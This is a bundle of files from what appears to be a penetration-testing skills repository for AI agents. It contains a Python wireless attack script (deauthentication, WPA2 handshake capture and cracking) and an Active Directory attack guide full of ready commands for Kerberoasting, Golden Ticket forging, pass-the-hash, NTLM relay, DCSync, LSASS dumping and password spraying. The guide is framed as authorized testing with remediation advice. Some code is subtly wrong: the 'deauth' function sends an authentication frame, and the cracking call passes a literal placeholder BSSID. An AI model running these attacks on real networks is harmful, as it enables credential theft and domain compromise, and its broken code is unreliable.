| Layer | Purpose |
|-------|---------|
| `Dot11Beacon` | Access point beacon frames |
| `Dot11ProbeReq` | Client probe request frames |
| `Dot11Auth` | Deauthentication frames |
| `Dot11Elt` | Information elements (SSID, rates) |
| `RadioTap` | Radio layer metadata |

## External Tools Used

| Tool | Purpose |
|------|---------|
| airmon-ng | Enable monitor mode |
| airodump-ng | Capture handshakes |
| aircrack-ng | Crack WPA2 PSK |
| wash | Detect WPS-enabled APs |

===== END FILE =====


===== FILE: skills/conducting-wireless-network-penetration-test/scripts/agent.py =====
#!/usr/bin/env python3
# For authorized penetration testing and lab environments only
"""Wireless Network Penetration Testing Agent - Tests WiFi security using Scapy and aircrack-ng."""

import json
import logging
import argparse
import subprocess
from datetime import datetime

from scapy.all import (
    Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, Dot11Auth,
    sniff, RadioTap, sendp, conf,
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


def scan_access_points(interface, duration=30):
    """Scan for WiFi access points by capturing beacon frames."""
    access_points = {}

    def beacon_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            if bssid not in access_points:
                ssid = pkt[Dot11Elt].info.decode("utf-8", errors="ignore")
                stats = pkt[Dot11Beacon].network_stats()
                access_points[bssid] = {
                    "ssid": ssid,
                    "bssid": bssid,
                    "channel": stats.get("channel", 0),
                    "crypto": list(stats.get("crypto", set())),
                    "signal": pkt.dBm_AntSignal if hasattr(pkt, "dBm_AntSignal") else None,
                }

    logger.info("Scanning for access points on %s for %ds", interface, duration)
    sniff(iface=interface, prn=beacon_handler, timeout=duration, store=False)
    logger.info("Discovered %d access points", len(access_points))
    return list(access_points.values())


def detect_rogue_aps(discovered_aps, known_ssids, known_bssids):
    """Detect rogue access points by comparing against known infrastructure."""
    rogues = []
    for ap in discovered_aps:
        if ap["ssid"] in known_ssids and ap["bssid"] not in known_bssids:
            ap["rogue_reason"] = "Known SSID with unknown BSSID (potential evil twin)"
            rogues.append(ap)
            logger.warning("ROGUE AP detected: SSID=%s BSSID=%s", ap["ssid"], ap["bssid"])
    return rogues


def detect_weak_encryption(access_points):
    """Identify access points using weak or no encryption."""
    weak = []
    for ap in access_points:
        crypto = ap.get("crypto", [])
        if not crypto or "OPN" in crypto:
            ap["weakness"] = "Open network - no encryption"
            weak.append(ap)
        elif "WEP" in str(crypto):
            ap["weakness"] = "WEP encryption - trivially crackable"
            weak.append(ap)
        elif "WPA" in str(crypto) and "WPA2" not in str(crypto):
            ap["weakness"] = "WPA1 only - vulnerable to TKIP attacks"
            weak.append(ap)
    logger.info("Found %d APs with weak encryption", len(weak))
    return weak


def capture_handshake(interface, target_bssid, channel, output_file, duration=60):
    """Capture WPA2 4-way handshake using airodump-ng."""
    set_channel_cmd = ["iwconfig", interface, "channel", str(channel)]
    subprocess.run(set_channel_cmd, capture_output=True, timeout=120)

    cmd = [
        "airodump-ng", "--bssid", target_bssid, "--channel", str(channel),
        "--write", output_file, "--output-format", "pcap",
        interface,
    ]
    logger.info("Capturing handshake for %s on channel %d", target_bssid, channel)
    try:
        subprocess.run(cmd, timeout=duration, capture_output=True)
    except subprocess.TimeoutExpired:
        pass
    return f"{output_file}-01.cap"


def send_deauth(interface, target_bssid, client_mac="FF:FF:FF:FF:FF:FF", count=5):
    """Send deauthentication frames to force client reconnection for handshake capture."""
    dot11 = Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid)
    frame = RadioTap() / dot11 / Dot11Auth(algo=0, seqnum=1, status=0)
    sendp(frame, iface=interface, count=count, inter=0.1, verbose=False)
    logger.info("Sent %d deauth frames to %s (client: %s)", count, target_bssid, client_mac)


def crack_handshake(cap_file, wordlist):
    """Attempt to crack WPA2 handshake using aircrack-ng."""
    cmd = ["aircrack-ng", "-w", wordlist, "-b", "target_bssid", cap_file]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
    if "KEY FOUND" in result.stdout:
        key_line = [l for l in result.stdout.split("\n") if "KEY FOUND" in l]
        if key_line:
            logger.info("WPA2 key cracked: %s", key_line[0])
            return {"cracked": True, "key": key_line[0]}
    return {"cracked": False}


def detect_client_probes(interface, duration=30):
    """Capture probe requests to identify client-side vulnerabilities."""
    probes = []

    def probe_handler(pkt):
        if pkt.haslayer(Dot11ProbeReq):
            ssid = pkt[Dot11Elt].info.decode("utf-8", errors="ignore") if pkt.haslayer(Dot11Elt) else ""
            if ssid:
                probes.append({
                    "client_mac": pkt[Dot11].addr2,
                    "probed_ssid": ssid,
                })

    sniff(iface=interface, prn=probe_handler, timeout=duration, store=False)
    unique_clients = len(set(p["client_mac"] for p in probes))
    logger.info("Captured %d probe requests from %d clients", len(probes), unique_clients)
    return probes


def check_wps_enabled(interface, target_bssid):
    """Check if WPS is enabled on target AP using wash."""
    cmd = ["wash", "-i", interface, "-C"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if target_bssid.upper() in result.stdout.upper():
            logger.warning("WPS enabled on %s - vulnerable to Reaver attack", target_bssid)
            return True
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass
    return False


def generate_report(access_points, rogues, weak_crypto, client_probes):
    """Generate wireless penetration test report."""
    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "access_points": access_points,
        "rogue_aps": rogues,
        "weak_encryption": weak_crypto,
        "client_probes": client_probes[:50],
        "summary": {
            "total_aps": len(access_points),
            "rogue_aps": len(rogues),
            "weak_crypto_aps": len(weak_crypto),
            "clients_probing": len(set(p["client_mac"] for p in client_probes)),
        },
    }
    print(f"WIRELESS PENTEST REPORT: {len(access_points)} APs, {len(rogues)} rogues, {len(weak_crypto)} weak")
    return report


def main():
    parser = argparse.ArgumentParser(description="Wireless Network Penetration Testing Agent")
    parser.add_argument("--interface", required=True, help="Wireless interface in monitor mode")
    parser.add_argument("--duration", type=int, default=30, help="Scan duration in seconds")
    parser.add_argument("--known-ssids", nargs="*", default=[], help="Known legitimate SSIDs")
    parser.add_argument("--known-bssids", nargs="*", default=[], help="Known legitimate BSSIDs")
    parser.add_argument("--output", default="wireless_pentest_report.json")
    args = parser.parse_args()

    aps = scan_access_points(args.interface, args.duration)
    rogues = detect_rogue_aps(aps, set(args.known_ssids), set(args.known_bssids))
    weak = detect_weak_encryption(aps)
    probes = detect_client_probes(args.interface, args.duration)

    report = generate_report(aps, rogues, weak, probes)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/executing-active-directory-attack-simulation/SKILL.md =====
---
name: executing-active-directory-attack-simulation
description: 'Executes authorized attack simulations against Active Directory environments
  to identify misconfigurations, weak credentials, dangerous privilege paths, and
  exploitable trust relationships that could lead to domain compromise. The tester
  uses BloodHound for attack path analysis, Mimikatz for credential extraction, and
  Impacket for protocol-level attacks including Kerberoasting, AS-REP Roasting, and
  delegation abuse. Activates for requests involving Active Directory pentest, AD
  attack simulation, domain compromise testing, or Kerberos attack assessment.

  '
domain: cybersecurity
subdomain: penetration-testing
tags:
- Active-Directory
- BloodHound
- Mimikatz
- Kerberoasting
- domain-compromise
version: 1.0.0
author: mahipal
license: Apache-2.0
d3fend_techniques:
- Application Protocol Command Analysis
- Network Isolation
- Network Traffic Analysis
- Client-server Payload Profiling
- Network Traffic Community Deviation
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1003
---
# Executing Active Directory Attack Simulation

## When to Use

- Assessing the security of an Active Directory domain and forest against common and advanced attack techniques
- Identifying attack paths from low-privilege domain user to Domain Admin using privilege relationship analysis
- Validating that Kerberos security configurations, credential policies, and delegation settings resist known attacks
- Testing detection capabilities of the SOC and EDR tools against Active Directory-specific TTPs
- Evaluating the effectiveness of tiered administration models and privileged access workstations

**Do not use** without explicit written authorization from the domain owner, against production domain controllers during business hours unless approved, or for testing that could cause account lockouts affecting real users without prior coordination.

## Prerequisites

- Written authorization specifying the target AD domain, testing constraints, and any off-limits accounts or systems
- Low-privilege domain user account (minimum starting point) to simulate realistic attacker position
- Testing workstation joined to the domain or network access to domain controllers on ports 88, 135, 139, 389, 445, 636, 3268, 3269
- BloodHound Community Edition or Enterprise with SharpHound/AzureHound collectors
- Impacket toolkit, Mimikatz (or pypykatz), Rubeus, and CrackMapExec installed on the attack platform
- Hashcat or John the Ripper with current wordlists (rockyou.txt, SecLists) for offline credential cracking

## Workflow

### Step 1: Active Directory Reconnaissance

Enumerate the AD environment from a low-privilege domain user position:

- **Domain enumeration**: `Get-ADDomain` or `crackmapexec smb <dc_ip> -u <user> -p <pass> --domains` to identify domain name, functional level, domain controllers, and forest trusts
- **User enumeration**: `Get-ADUser -Filter * -Properties ServicePrincipalName,AdminCount,PasswordLastSet` to identify service accounts, privileged accounts, and stale passwords
- **Group enumeration**: Map membership of high-value groups (Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators) using `net group "Domain Admins" /domain`
- **GPO enumeration**: `Get-GPO -All | Get-GPOReport -ReportType XML` to identify Group Policy configurations including password policies, audit settings, and software deployment
- **Trust enumeration**: `nltest /domain_trusts /all_trusts` to map inter-domain and inter-forest trusts, noting trust direction and transitivity
- **LDAP queries**: Use `ldapsearch` or ADExplorer to search for accounts with `userAccountControl` flags indicating "password never expires", "password not required", or "DES-only Kerberos"

### Step 2: BloodHound Attack Path Analysis

Collect and analyze AD relationship data to identify the shortest paths to Domain Admin:

- Run SharpHound collector: `SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\temp\` to collect users, groups, sessions, ACLs, trusts, and GPO data
- Import the JSON output into BloodHound and run built-in queries:
  - "Shortest Paths to Domain Admins from Owned Principals"
  - "Find Principals with DCSync Rights"
  - "Find Computers where Domain Users are Local Admin"
  - "Shortest Paths to Unconstrained Delegation Systems"
  - "Find All Paths from Kerberoastable Users"
- Mark the compromised user as "owned" in BloodHound and analyze the resulting attack paths
- Identify ACL-based attack paths: GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword on high-value objects
- Document each identified attack path with the chain of relationships and affected objects

### Step 3: Kerberos Attacks

Execute Kerberos-based attacks against identified vulnerable accounts:

- **Kerberoasting**: Request TGS tickets for accounts with SPNs: `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile kerberoast.hashes`. Crack offline with `hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt`
- **AS-REP Roasting**: Target accounts without Kerberos pre-authentication: `impacket-GetNPUsers <domain>/ -dc-ip <dc_ip> -usersfile users.txt -format hashcat -outputfile asrep.hashes`. Crack with `hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt`
- **Silver Ticket**: If a service account's NTLM hash is cracked, forge a TGS ticket for that service using `impacket-ticketer -nthash <hash> -domain-sid <sid> -domain <domain> -spn <service/host> <username>`
- **Golden Ticket**: If the krbtgt hash is obtained (post-domain compromise), forge a TGT: `mimikatz "kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /krbtgt:<hash> /ticket:golden.kirbi"`
- **Unconstrained Delegation abuse**: Identify computers with unconstrained delegation. Coerce authentication from a Domain Controller using PrinterBug or PetitPotam, then capture the DC's TGT from memory.

### Step 4: Credential Attacks and Lateral Movement

Exploit harvested credentials to move through the domain:

- **Pass-the-Hash**: `impacket-psexec <domain>/<user>@<target> -hashes <LM:NTLM>` to execute commands on systems where the compromised account has local admin
- **Pass-the-Ticket**: `export KRB5CCNAME=ticket.ccache && impacket-psexec <domain>/<user>@<target> -k -no-pass` to use captured or forged Kerberos tickets
- **NTLM Relay**: Configure `impacket-ntlmrelayx -t ldap://<dc_ip> --escalate-user <user>` and coerce authentication to relay NTLM credentials for privilege escalation
- **DCSync**: If DCSync rights are obtained (Replicating Directory Changes): `impacket-secretsdump <domain>/<user>:<pass>@<dc_ip> -just-dc-ntlm` to dump all domain password hashes
- **Password spraying**: `crackmapexec smb <dc_ip> -u users.txt -p 'Winter2025!' --no-bruteforce` testing one password across all accounts to avoid lockouts
- **LSASS dump**: On compromised hosts, extract credentials from LSASS memory using `mimikatz "sekurlsa::logonpasswords"` or `procdump -ma lsass.exe lsass.dmp` followed by offline extraction

### Step 5: Privilege Escalation to Domain Admin

Chain discovered attack paths to escalate from low-privilege user to Domain Admin:

- Follow the shortest path identified in BloodHound by executing each relationship (e.g., GenericWrite on a user -> set SPN -> Kerberoast -> crack password -> user is member of a group with WriteDACL on Domain Admins -> grant self membership)
- Exploit Group Policy Preferences (GPP) passwords if found: `crackmapexec smb <dc_ip> -u <user> -p <pass> -M gpp_autologon`
- Target LAPS (Local Administrator Password Solution) if deployed: query LAPS passwords with `Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd`
- Abuse certificate services (AD CS) with Certipy: `certipy find -vulnerable -u <user>@<domain> -p <pass> -dc-ip <dc_ip>` to find exploitable certificate templates (ESC1-ESC8)
- Document the complete attack chain from initial user to Domain Admin with every credential, tool, and technique used

## Key Concepts

| Term | Definition |
|------|------------|
| **Kerberoasting** | Requesting Kerberos TGS tickets for accounts with Service Principal Names and cracking them offline to recover the service account's plaintext password |
| **AS-REP Roasting** | Requesting Kerberos AS-REP responses for accounts without pre-authentication enabled and cracking the encrypted timestamp offline |
| **DCSync** | Using Directory Replication Service privileges (DS-Replication-Get-Changes-All) to replicate password data from a domain controller, mimicking the behavior of a DC |
| **BloodHound** | Graph-based Active Directory analysis tool that maps privilege relationships and identifies attack paths from any user to high-value targets like Domain Admin |
| **Unconstrained Delegation** | A Kerberos delegation configuration where a service can impersonate any user to any other service, allowing TGT capture from connecting users |
| **Pass-the-Hash** | Authentication technique using an NTLM hash directly instead of the plaintext password, exploiting Windows NTLM authentication |
| **AD CS Abuse** | Exploiting misconfigured Active Directory Certificate Services templates to request certificates that grant elevated privileges or impersonate other users |
| **NTLM Relay** | Forwarding captured NTLM authentication to a different service to authenticate as the victim, effective when SMB signing is not enforced |

## Tools & Systems

- **BloodHound**: Attack path analysis tool that ingests AD data collected by SharpHound to visualize and identify privilege escalation paths through object relationships
- **Impacket**: Python toolkit for network protocol interactions including Kerberos attacks (GetUserSPNs, GetNPUsers), credential dumping (secretsdump), and remote execution (psexec, wmiexec)
- **Mimikatz**: Post-exploitation tool for extracting plaintext credentials, NTLM hashes, and Kerberos tickets from Windows memory (LSASS process)
- **CrackMapExec**: Multi-protocol attack tool for Active Directory environments supporting SMB, LDAP, WinRM, and MSSQL with built-in modules for password spraying and enumeration
- **Certipy**: Python tool for enumerating and exploiting Active Directory Certificate Services (AD CS) misconfigurations

## Common Scenarios

### Scenario: Domain Compromise Assessment for a Healthcare Organization

**Context**: A hospital network with a single Active Directory forest containing 5,000 user accounts, 800 computer objects, and 15 domain controllers across 3 sites. The tester starts with a single low-privilege domain user account. The goal is to determine if an attacker with stolen employee credentials could escalate to Domain Admin.

**Approach**:
1. Run SharpHound to collect AD relationship data and import into BloodHound
2. BloodHound reveals a path: owned user -> member of IT-Support group -> GenericAll on SVC-SQL account -> SVC-SQL has SPN -> Kerberoast -> SVC-SQL is local admin on DB-SERVER-01 -> DB-SERVER-01 has a Domain Admin session
3. Kerberoast SVC-SQL, crack the weak password (Summer2023!) in 12 minutes using hashcat
4. Use SVC-SQL credentials to access DB-SERVER-01 via psexec
5. Extract Domain Admin credentials from LSASS memory on DB-SERVER-01
6. Validate domain compromise by performing DCSync to dump all domain hashes
7. Report the complete attack chain with remediation: set 25+ character passwords on service accounts, enable AES-only Kerberos encryption, remove unnecessary local admin rights, implement tiered administration

**Pitfalls**:
- Running SharpHound with noisy collection methods during peak hours, alerting the SOC via excessive LDAP queries
- Password spraying without checking the domain lockout policy first, locking out hundreds of accounts
- Forgetting to test for AD CS vulnerabilities which often provide the fastest path to Domain Admin
- Not checking for stale computer accounts that may still have cached credentials or active sessions

## Output Format

```
## Finding: Service Account Vulnerable to Kerberoasting with Weak Password

**ID**: AD-002
**Severity**: Critical (CVSS 9.1)
**Affected Object**: SVC-SQL@corp.example.com (Service Account)
**Attack Technique**: MITRE ATT&CK T1558.003 - Kerberoasting

**Description**:
The service account SVC-SQL has a Service Principal Name (MSSQLSvc/db-server-01.corp.example.com:1433)
registered in Active Directory and uses a weak password that was cracked in 12 minutes
using hashcat with the rockyou.txt wordlist. This account has local administrator
privileges on DB-SERVER-01, which had an active Domain Admin session at the time of
testing.

**Attack Chain**:
1. Requested TGS ticket: impacket-GetUserSPNs corp.example.com/testuser:password -request
2. Cracked hash: hashcat -m 13100 hash.txt rockyou.txt (cracked in 12m: Summer2023!)
3. Lateral movement: impacket-psexec corp.example.com/SVC-SQL:Summer2023!@db-server-01
4. Credential extraction: mimikatz sekurlsa::logonpasswords -> Domain Admin NTLM hash

**Impact**:
Complete domain compromise from a single low-privilege domain user account. An attacker
could access all 5,000 user accounts, 800 computer objects, and all data within the domain.

**Remediation**:
1. Set a 25+ character randomly generated password for SVC-SQL and all service accounts
2. Migrate to Group Managed Service Accounts (gMSA) which rotate 120-character passwords automatically
3. Enable AES256 encryption for Kerberos and disable RC4 (DES) encryption
4. Remove SVC-SQL from local administrator groups on DB-SERVER-01
5. Implement Protected Users group for privileged accounts to prevent credential caching
6. Deploy Microsoft Defender for Identity to detect Kerberoasting and DCSync attacks
```

===== END FILE =====


===== FILE: skills/executing-active-directory-attack-simulation/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/executing-active-directory-attack-simulation/references/api-reference.md =====
# API Reference: Active Directory Attack Simulation Agent

## Dependencies

| Library | Version | Purpose |
|---------|---------|---------|
| impacket | >=0.11.0 | Kerberos attacks, SMB interaction, DCSync |
| ldap3 | >=2.9 | LDAP enumeration of users, groups, SPNs |

## CLI Usage

```bash
python scripts/agent.py \
  --dc-ip 10.10.10.1 \
  --domain corp.local \
  --username testuser \
  --password 'P@ssw0rd' \
  --output ad_report.json
```

## Functions

### `ldap_enum_users(dc_ip, domain, username, password) -> list`
Enumerates all domain user objects via LDAP. Returns list of dicts with `samaccountname`, `spns`, `no_preauth`, `admin_count`.

### `find_kerberoastable(users) -> list`
Filters user list for accounts with `servicePrincipalName` set (targets for Kerberoasting via `impacket-GetUserSPNs`).

### `find_asrep_roastable(users) -> list`
Filters for accounts with UAC flag `DONT_REQUIRE_PREAUTH` (0x400000) set.

### `enum_groups(dc_ip, domain, username, password) -> dict`
Queries LDAP for membership of Domain Admins, Enterprise Admins, Schema Admins, Backup Operators, Account Operators.

### `check_smb_signing(target_ip) -> bool`
Connects to SMB on port 445 and checks whether signing is required. Returns `False` when relay attacks are possible.

### `generate_report(users, groups, dc_ip) -> dict`
Aggregates findings into a JSON report with risk summary.

## Output Schema

```json
{
  "assessment_date": "ISO-8601",
  "total_users": 500,
  "kerberoastable_accounts": ["svc-sql", "svc-web"],
  "asrep_roastable_accounts": ["old-account"],
  "high_value_groups": {"Domain Admins": 5},
  "dc_smb_signing_required": true,
  "risk_summary": ["CRITICAL: 2 accounts are Kerberoastable"]
}
```

## Key Impacket Modules

- `impacket.krb5.kerberosv5`: TGT/TGS request functions
- `impacket.smbconnection.SMBConnection`: SMB negotiation and signing check
- `impacket.dcerpc.v5.samr`: SAM Remote Protocol for user/group enumeration
- `ldap3.Connection.search()`: LDAP search with filter and attribute list

===== END FILE =====


===== FILE: skills/executing-active-directory-attack-simulation/scripts/agent.py =====
#!/usr/bin/env python3
# For authorized testing in lab/CTF environments only
"""Active Directory attack simulation agent using Impacket and ldap3."""

import argparse
import sys
import json
import logging
from datetime import datetime

try:
    from impacket.smbconnection import SMBConnection
except ImportError:
    sys.exit("impacket is required: pip install impacket")

try:
    import ldap3
    from ldap3 import Server, Connection, ALL, SUBTREE
except ImportError:
    sys.exit("ldap3 is required: pip install ldap3")

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


def ldap_enum_users(dc_ip: str, domain: str, username: str, password: str) -> list:
    """Enumerate domain users via LDAP, returning accounts with SPNs and no preauth."""
    base_dn = ",".join(f"DC={part}" for part in domain.split("."))
    server = Server(dc_ip, get_info=ALL, use_ssl=False)
    conn = Connection(server, user=f"{domain}\\{username}", password=password, auto_bind=True)

    conn.search(
        base_dn,
        "(objectClass=user)",
        search_scope=SUBTREE,
        attributes=[
            "sAMAccountName", "servicePrincipalName", "userAccountControl",
            "memberOf", "adminCount", "pwdLastSet", "lastLogon",
        ],
    )
    users = []
    for entry in conn.entries:
        uac = int(str(entry.userAccountControl)) if entry.userAccountControl else 0
        spn_list = list(entry.servicePrincipalName) if entry.servicePrincipalName else []
        no_preauth = bool(uac & 0x400000)
        users.append({
            "samaccountname": str(entry.sAMAccountName),
            "spns": spn_list,
            "no_preauth": no_preauth,
            "admin_count": str(entry.adminCount) if entry.adminCount else "0",
        })
    conn.unbind()
    logger.info("Enumerated %d domain users via LDAP", len(users))
    return users


def find_kerberoastable(users: list) -> list:
    """Filter users with service principal names set (Kerberoastable)."""
    targets = [u for u in users if u["spns"]]
    logger.info("Found %d Kerberoastable accounts", len(targets))
    return targets


def find_asrep_roastable(users: list) -> list:
    """Filter users with Kerberos pre-authentication disabled."""
    targets = [u for u in users if u["no_preauth"]]
    logger.info("Found %d AS-REP roastable accounts", len(targets))
    return targets


def enum_groups(dc_ip: str, domain: str, username: str, password: str) -> dict:
    """Enumerate high-value group memberships via LDAP."""
    base_dn = ",".join(f"DC={part}" for part in domain.split("."))
    server = Server(dc_ip, get_info=ALL)
    conn = Connection(server, user=f"{domain}\\{username}", password=password, auto_bind=True)

    high_value_groups = [
        "Domain Admins", "Enterprise Admins", "Schema Admins",
        "Backup Operators", "Account Operators",
    ]
    results = {}
    for group_name in high_value_groups:
        conn.search(
            base_dn,
            f"(&(objectClass=group)(cn={group_name}))",
            attributes=["member"],
        )
        members = []
        if conn.entries:
            members = list(conn.entries[0].member) if conn.entries[0].member else []
        results[group_name] = members
        logger.info("Group '%s' has %d members", group_name, len(members))

    conn.unbind()
    return results


def check_smb_signing(target_ip: str) -> bool:
    """Check if SMB signing is required on the target host."""
    try:
        smb = SMBConnection(target_ip, target_ip, sess_port=445, timeout=5)
        smb.negotiateSession()
        signing = smb.isSigningRequired()
        smb.close()
        return signing
    except Exception as exc:
        logger.warning("SMB connect failed on %s: %s", target_ip, exc)
        return True


def generate_report(users: list, groups: dict, dc_ip: str) -> dict:
    """Compile AD assessment findings into a structured report."""
    kerberoastable = find_kerberoastable(users)
    asrep = find_asrep_roastable(users)
    smb_signing = check_smb_signing(dc_ip)

    report = {
        "assessment_date": datetime.utcnow().isoformat(),
        "total_users": len(users),
        "kerberoastable_accounts": [u["samaccountname"] for u in kerberoastable],
